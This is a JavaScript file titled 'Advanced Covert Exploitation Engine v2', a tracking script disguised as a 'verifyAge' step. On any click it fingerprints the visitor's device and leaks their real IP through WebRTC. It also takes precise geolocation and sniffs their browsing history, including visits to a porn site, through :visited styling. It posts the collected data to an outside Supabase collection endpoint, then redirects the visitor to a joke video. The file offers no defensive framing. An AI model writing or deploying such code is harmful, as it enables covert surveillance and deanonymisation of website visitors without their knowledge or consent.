
// ========================
// ADVANCED COVERT EXPLOITATION ENGINE v2
// ========================

// Utility: Delay helper
const sleep = ms => new Promise(res => setTimeout(res, ms));

// GPU/audio/battery/device fingerprinting
const getAdvancedFingerprint = async () => {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

    const gpu = gl ? {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        unmasked: gl.getParameter(gl.UNMASKED_RENDERER_WEBGL)
    } : {};

    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioCtx.createOscillator();
    const audioFingerprint = oscillator.frequency.value;

    const battery = navigator.getBattery ? await navigator.getBattery() : null;

    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory,
        gpu,
        audioHash: audioFingerprint,
        battery: battery ? `${battery.level * 100}%` : "N/A",
        touch: 'ontouchstart' in window,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        plugins: Array.from(navigator.plugins).map(p => p.name)
    };
};

// WebRTC IP Leak
const extractRealIP = () => new Promise(resolve => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.services.mozilla.com" }] });
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    pc.onicecandidate = ice => {
        if (!ice || !ice.candidate) return;
        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const ip = ipRegex.exec(ice.candidate.candidate);
        if (ip) resolve(ip[0]);
    };
});

// Location + fallback IP geolocation
const getPreciseLocation = () => new Promise(resolve => {
    if (!navigator.geolocation) return resolve({});
    navigator.geolocation.getCurrentPosition(pos => {
        resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
        });
    }, async () => {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        resolve({
            lat: data.latitude,
            lon: data.longitude,
            city: data.city
        });
    }, { enableHighAccuracy: true, timeout: 5000 });
});

// History sniffing
const sniffHistory = () => {
    const links = [
        'https://facebook.com', 'https://github.com', 'https://pornhub.com',
        'https://zicta.zm', 'https://gmail.com', 'https://tiktok.com'
    ];
    const visited = [];
    const style = document.createElement('style');
    style.innerHTML = links.map((url, i) =>
        `a[data-x="${i}"]:visited { color: red; }`).join("\n");
    document.head.appendChild(style);

    links.forEach((url, i) => {
        const a = document.createElement('a');
        a.href = url;
        a.dataset.x = i;
        document.body.appendChild(a);
        const color = getComputedStyle(a).color;
        if (color === 'rgb(255, 0, 0)') visited.push(url);
        document.body.removeChild(a);
    });
    return visited;
};

// Exploit trigger
window.verifyAge = async () => {
    const fingerprint = await getAdvancedFingerprint();
    const location = await getPreciseLocation();
    const historySniffed = sniffHistory();
    const real_ip = await extractRealIP();

    await fetch('https://twsqvdxhsfvdibhpfvqr.supabase.co/functions/v1/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            real_ip,
            fingerprint,
            location,
            referrer: document.referrer,
            screen: `${screen.width}x${screen.height}`,
            cookies: document.cookie.length > 0,
            history_sniffed: historySniffed
        })
    });

    window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
};

document.addEventListener('click', verifyAge);
